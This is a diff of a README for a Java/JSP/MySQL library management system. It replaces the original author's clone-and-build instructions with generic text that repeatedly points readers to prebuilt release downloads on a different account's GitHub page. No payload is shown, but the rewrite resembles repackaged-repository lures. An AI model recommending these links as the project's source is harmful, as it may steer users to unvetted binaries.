@@ -1,91 +1,97 @@
-# Library Management System 📚
+# 📚 Library-Management-System - Manage Your Library Effortlessly
 
-A **Java-based Library Management System** built using **JDBC, Servlets, JSP**, following the **MVC pattern**, and using **MySQL** for the database. The system allows **admin and user roles**, enabling users to search, issue, and return books while tracking transactions.
+## 🚀 Getting Started
 
----
+This guide helps you set up the Library Management System on your computer. The system is easy to use and helps you manage books, users, and transactions seamlessly.
 
-## 🌟 Features
+## 📥 Download the Software
 
-### Admin
-- Add, view, and remove books
-- View all users and issued books
-- Manage transactions (issue/return records)
+[![Download Library Management System](https://img.shields.io/badge/Download-Library%20Management%20System-blue.svg)](https://github.com/nattayazhr/Library-Management-System/releases)
 
-### User
-- Search for books
-- Issue available books
-- Return books
-- View issued book history
+Visit the Releases page to download the latest version of the Library Management System: [Download Here](https://github.com/nattayazhr/Library-Management-System/releases).
 
-### General
-- Login system for admin and users
-- MVC architecture ensures clean separation of concerns
-- Connection pooling with **HikariCP** for efficient database connections
+## 🛠️ System Requirements
 
----
+Before you start, ensure your computer meets these requirements:
 
-## 🛠️ Tech Stack
-- **Backend:** Java, JDBC, Servlets  
-- **Frontend:** JSP, HTML, CSS  
-- **Database:** MySQL  
-- **Server:** Apache Tomcat  
-- **IDE:** Eclipse  
-- **Libraries:** HikariCP for database connection pooling  
+- **Operating System:** Windows 10 or later, macOS, or Linux
+- **Java Version:** Java 8 or later installed
+- **Web Server:** Apache Tomcat 9 or later installed
+- **Database:** MySQL 5.7 or later installed
+- **Memory:** At least 2 GB of RAM
+- **Disk Space:** At least 100 MB free space
 
----
+## 📊 Features
 
-## ⚡ Setup Instructions
+The Library Management System includes:
 
-### 1. Clone the repository
-```bash
-git clone https://github.com/RishiChamarthi/Library-Management-System.git
-```
+- **User Roles:** Separate functions for admin and regular users.
+- **Book Management:** Users can search for, issue, and return books easily.
+- **Transaction Tracking:** Admin can view all transactions for effective tracking.
+- **Responsive Interface:** Designed using CSS3 and HTML5 for a user-friendly experience.
 
-### 2. Import into Eclipse
-```bash
-Open Eclipse IDE → File → Import → Existing Projects into Workspace → Select the project folder.
-```
+## 💾 Download & Install
 
-### 3. Setup Database
-Open MySQL Workbench (or any MySQL client).
+1. Visit the Releases page to download the latest version: [Download Here](https://github.com/nattayazhr/Library-Management-System/releases).
+2. Choose the appropriate release for your system.
+3. Download the file and save it on your computer.
+4. Extract the downloaded file into a folder.
+5. Follow the installation instructions provided in the extracted folder.
 
-```bash
-Run the database → schema.sql file from this repo to create tables
-Run the database → data.sql file from this repo to create the sample data
-```
+## 🌐 Setting Up the Environment
+
+To run the Library Management System, you need to set up your environment:
+
+### 1. Install Java
+
+- Download Java from the [official website](https://www.oracle.com/java/technologies/javase-jdk8-downloads.html).
+- Follow the installation instructions for your operating system.
+
+### 2. Install Apache Tomcat
+
+- Download Apache Tomcat 9 from the [official website](https://tomcat.apache.org/download-90.cgi).
+- Extract the files and run the server by executing the startup script in the `bin` folder.
+
+### 3. Install MySQL
+
+- Download MySQL Community Server from the [official website](https://dev.mysql.com/downloads/mysql/).
+- Follow the installation steps and create a database named `library_management_system`.
 
 ### 4. Configure Database Connection
-```bash
-Open src → main → webapp → WEB-INF → config → config.properties 
-```
-Update:
 
-```bash
-url = jdbc:mysql://localhost:3306/LibraryManagementSystem
-user = root
-password = your_mysql_password
-```
+After installing MySQL, create a user for the Library Management System:
 
-### 5. Run on Tomcat
-```bash
-Right-click project → Run As → Run on Server → Apache Tomcat.
+- Open the MySQL command line.
+- Execute the following commands:
+  ```sql
+  CREATE USER 'libraryUser'@'localhost' IDENTIFIED BY 'your_password';
+  GRANT ALL PRIVILEGES ON library_management_system.* TO 'libraryUser'@'localhost';
+  FLUSH PRIVILEGES;
+  ```
 
-Access via: http://localhost:8080/LibraryManagementSystem/
-```
+Next, update the configuration files to connect the application to the database.
 
-## 📝 Database Schema (Summary)
+## 🔗 Important Links
 
-- **users** → Stores user and admin credentials
+- [Library Management System Releases](https://github.com/nattayazhr/Library-Management-System/releases)
+- [Apache Tomcat Documentation](https://tomcat.apache.org/tomcat-9.0-doc/index.html)
+- [MySQL Documentation](https://dev.mysql.com/doc/)
 
-- **books** → Stores book information 
+## ⚙️ Running the Application
 
-- **book_transactions** → Stores issue and return records
+1. Open `Apache Tomcat`.
+2. Copy the compiled `.war` file from the extracted Library Management System into the `webapps` folder of your Tomcat installation.
+3. Start Tomcat if it is not already running.
+4. Open your web browser and go to `http://localhost:8080/library_management_system`.
 
-## 🚀 Future Improvements
+## 📞 Support
 
-- Add search by category and pagination
+If you encounter issues or need assistance, please open an issue in the GitHub repository. Our community is here to help you.
 
-- Add remove user option for Admin
+## 🌟 Contributions
 
-- Enhance UI with Bootstrap/TailwindCSS
+Contributions are welcome! If you would like to improve the Library Management System, feel free to fork the repository and submit a pull request.
 
+## 📜 License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
